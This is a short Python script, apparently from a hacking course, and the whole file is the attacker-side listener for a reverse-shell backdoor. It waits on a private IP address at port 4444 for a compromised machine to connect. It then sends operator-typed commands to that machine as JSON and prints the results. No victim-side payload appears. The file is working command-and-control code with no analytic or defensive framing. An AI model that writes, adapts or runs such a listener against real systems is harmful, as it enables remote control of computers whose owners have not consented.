#!/usr/bin/env python3

import socket
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("\n[+] Waiting for incoming connections\n")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        # self.connection.send(command.encode("utf-8"))  # got a binary from string
        # return self.connection.recv(1024)
        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            # print(result.decode("utf-8"))
            print(result)


my_listener = Listener("192.168.0.108", 4444)
my_listener.run()
